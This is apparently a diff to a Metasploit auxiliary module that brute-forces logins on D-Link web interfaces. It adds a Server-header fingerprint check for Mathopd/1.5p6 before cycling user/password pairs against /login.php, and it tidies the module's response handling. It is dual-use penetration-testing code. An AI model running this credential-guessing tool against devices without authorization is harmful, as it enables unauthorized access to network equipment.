@@ -53,11 +53,31 @@ class Metasploit3 < Msf::Auxiliary
 		"#{proto}://#{rhost}:#{rport}#{@uri.to_s}"
 	end
 
+	def is_dlink?
+		response = send_request_cgi({
+			'uri' => @uri,
+			'method' => 'GET'
+		})
+
+		if response and response.headers['Server'] and response.headers['Server'] =~ /Mathopd\/1\.5p6/
+			return true
+		else
+			return false
+		end
+	end
+
 	def run_host(ip)
 
 		@uri = "/login.php"
 
-		print_status("Attempting to login to #{target_url}")
+		if is_dlink?
+			vprint_good("#{target_url} - DLink device detected")
+		else
+			vprint_error("#{target_url} - Dlink device doesn't detected")
+			return
+		end
+
+		print_status("#{target_url} - Attempting to login")
 
 		each_user_pass { |user, pass|
 			do_login(user, pass)
@@ -103,10 +123,8 @@ class Metasploit3 < Msf::Auxiliary
 					"login" => "+Log+In+"
 				}
 			})
-			return if response.nil?
-			return if (response.headers['Server'].nil? or response.headers['Server'] !~ /Mathopd\/1\.5p6/)
-			return if (response.code == 404)
-
+			return nil if response.nil?
+			return nil if (response.code == 404)
 			return response
 		rescue ::Rex::ConnectionError
 			vprint_error("#{target_url} - Failed to connect to the web server")
@@ -115,6 +133,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def determine_result(response)
+		return :abort if response.nil?
 		return :abort unless response.kind_of? Rex::Proto::Http::Response
 		return :abort unless response.code
 		if response.body =~ /\<META\ HTTP\-EQUIV\=Refresh\ CONTENT\=\'0\;\ url\=index.php\'\>/
